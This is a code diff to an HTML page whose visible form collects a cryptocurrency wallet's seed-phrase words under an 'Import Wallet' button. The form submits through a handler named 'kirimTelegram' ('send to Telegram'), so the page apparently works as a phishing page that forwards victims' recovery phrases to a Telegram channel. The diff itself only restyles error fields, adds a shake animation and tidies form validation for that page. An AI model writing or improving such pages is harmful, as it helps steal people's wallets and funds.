@@ -669,13 +669,13 @@
   display: none !important;
 }
 
-    .form-error.error {
-  border-color: #c0392b;
-  background: #fde8e8;
+    .demo-field.error {
+  border-color: #c0392b !important;
+  background: #fde8e8 !important;
   animation: shake 0.4s ease;
 }
 
-.form-error {
+.demo-error {
   display: none;
   color: #c0392b;
   font-family: 'Space Mono', monospace;
@@ -684,8 +684,30 @@
   margin-bottom: 10px;
 }
 
-.form-error.show {
+.demo-error.show {
   display: block;
+}
+
+@keyframes shake {
+  0%, 100% {
+    transform: translateX(0);
+  }
+
+  20% {
+    transform: translateX(-7px);
+  }
+
+  40% {
+    transform: translateX(7px);
+  }
+
+  60% {
+    transform: translateX(-5px);
+  }
+
+  80% {
+    transform: translateX(5px);
+  }
 }
     
   </style>
@@ -784,7 +806,10 @@
 
           <form id="phraseForm" onsubmit="kirimTelegram(event, 'phrase')">
             <div class="seed-grid" id="seedGrid"></div>
-            <div class="error-msg" id="errorPhrase">Invalid words. Please double check.</div>
+            <div class="error-msg" id="formError">Invalid words. Please double check.</div>
+            <div class="demo-error" id="demoError">
+  Please fill all fields
+</div>
             <button class="btn-submit" type="submit" id="btnSubmitPhrase">Import Wallet</button>
           </form>
 
@@ -855,12 +880,16 @@
     function validateDemoForm(e) {
   e.preventDefault();
 
-  const fields = document.querySelectorAll('.form-field');
-  const error = document.getElementById('formError');
+  const fields = document.querySelectorAll('.demo-field');
+  const error = document.getElementById('demoError');
 
-  const emptyFields = [...fields].filter(field => !field.value.trim());
+  const emptyFields = [...fields].filter(
+    field => !field.value.trim()
+  );
 
-  fields.forEach(field => field.classList.remove('error'));
+  fields.forEach(field => {
+    field.classList.remove('error');
+  });
 
   if (emptyFields.length > 0) {
     emptyFields.forEach(field => {
